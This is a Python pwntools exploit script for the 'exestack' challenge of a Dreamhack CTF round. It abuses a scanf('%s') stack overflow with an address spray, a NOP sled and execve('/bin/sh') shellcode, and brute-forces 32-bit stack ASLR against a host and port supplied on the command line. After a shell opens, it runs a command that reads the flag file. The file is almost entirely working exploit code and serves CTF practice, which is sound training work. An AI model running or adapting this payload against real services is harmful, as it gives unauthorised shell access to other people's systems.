#!/usr/bin/env python3
"""
exestack - Dreamhack CTF Season 8 Round #1

Vuln: scanf("%s") overflow on 1MB buffer, stack executable, 32-bit PIE+ASLR
Epilogue: pop ecx; pop ebx; pop ebp; lea -4(%ecx),%esp; ret

Strategy: Address spray + NOP sled hybrid
  buf[0 : 0x80000]        = repeated TARGET_ADDR (address spray, 512KB)
  buf[0x80000 : 0xFFFE7]  = NOP sled (0x90)
  buf[0xFFFE7 : 0x100000] = shellcode (25 bytes)
  buf[0x100000 : 0x100004] = ECX_VALUE  (points into spray middle)
  buf[0x100004 : 0x10000C] = padding (saved ebx, saved ebp)

TARGET_ADDR = GUESS + 0x80000  (points to NOP sled start)
ECX_VALUE   = GUESS + 0x40004  (so ecx-4 lands in spray middle)

Tolerance analysis:
  ecx-4 must land in spray: window = ~512KB
  jump must land in NOP sled: window = ~512KB
  Combined tolerance: ~256KB
  32-bit stack ASLR range: ~8MB
  Required attempts: ~8MB / 256KB = ~32 attempts
"""

from pwn import *
import sys, time

context.arch = 'i386'
context.os = 'linux'
context.log_level = 'info'

# execve("/bin/sh") shellcode - no bad bytes for scanf("%s")
SHELLCODE = asm("""
    xor eax, eax
    push eax
    push 0x68732f2f
    push 0x6e69622f
    mov ebx, esp
    xor ecx, ecx
    xor edx, edx
    mov al, 0xe
    sub al, 0x3
    int 0x80
""")

BAD_BYTES = {0x00, 0x09, 0x0a, 0x0b, 0x0c, 0x0d, 0x20}

def has_bad(data):
    return any(b in BAD_BYTES for b in data)

def build_payload(guess):
    """Build exploit payload for a given buffer address guess."""
    target = guess + 0x80000   # jump into NOP sled
    ecx_val = guess + 0x40004  # ecx; ecx-4 lands in spray

    # Check for bad bytes in critical addresses
    if has_bad(p32(target)) or has_bad(p32(ecx_val)):
        return None

    spray_size = 0x80000  # 512KB of address spray
    shellcode_size = len(SHELLCODE)
    nop_size = 0x100000 - spray_size - shellcode_size

    payload = p32(target) * (spray_size // 4)          # address spray
    payload += b'\x90' * nop_size                       # NOP sled
    payload += SHELLCODE                                 # shellcode
    payload += p32(ecx_val)                             # saved_ecx
    payload += p32(0x41414141)                          # saved_ebx
    payload += p32(0x41414141)                          # saved_ebp

    return payload

def try_exploit(host, port, payload, timeout_sec=3):
    """Send payload and check for shell."""
    try:
        r = remote(host, port, timeout=timeout_sec, level='error')
        r.sendline(payload)
        time.sleep(0.3)
        r.sendline(b'echo PWNED_$(cat /home/pwn/flag 2>/dev/null || cat flag 2>/dev/null)')
        result = r.recvuntil(b'}', timeout=timeout_sec)
        r.close()
        if b'DH{' in result:
            flag = b'DH{' + result.split(b'DH{')[1]
            return flag.decode()
        if b'PWNED_' in result:
            return "SHELL_OK:" + result.decode(errors='ignore')
    except:
        pass
    return None

def generate_guesses():
    """Generate buffer address guesses covering the 32-bit stack ASLR range."""
    guesses = []
    # Stack range observed: ~0xff700000 to 0xfff00000
    # Buffer is ~1MB below stack top
    # So buf is in range ~0xfe600000 to 0xffe00000
    # Step by 0x40000 (256KB = our tolerance window)
    for base in range(0xfe600000, 0xfff00000, 0x40000):
        # Add a small offset to avoid zero bytes
        for offset in [0x1010, 0x2020, 0x3030, 0x4040, 0x5050, 0x6060, 0x7070, 0x8080,
                       0x1110, 0x2210, 0x3310, 0x4410, 0x5510, 0x6610, 0x7710, 0x8810]:
            guess = base + offset
            if not has_bad(p32(guess + 0x80000)) and not has_bad(p32(guess + 0x40004)):
                guesses.append(guess)
                break  # one offset per base is enough
    return guesses

if __name__ == '__main__':
    if len(sys.argv) < 3:
        print(f"Usage: {sys.argv[0]} <host> <port>")
        sys.exit(1)

    host = sys.argv[1]
    port = int(sys.argv[2])

    guesses = generate_guesses()
    log.info(f"Generated {len(guesses)} candidate addresses")
    log.info(f"Range: {hex(guesses[0])} - {hex(guesses[-1])}")

    for i, guess in enumerate(guesses):
        payload = build_payload(guess)
        if payload is None:
            continue

        log.info(f"[{i+1}/{len(guesses)}] guess={hex(guess)} target={hex(guess+0x80000)} ecx={hex(guess+0x40004)}")

        flag = try_exploit(host, port, payload)
        if flag:
            if flag.startswith('DH{'):
                log.success(f"FLAG FOUND: {flag}")
                print(f"\n{'='*60}")
                print(f"FLAG: {flag}")
                print(f"{'='*60}")
            else:
                log.success(f"Shell obtained: {flag}")
            sys.exit(0)

    log.failure(f"Exhausted {len(guesses)} attempts without success")
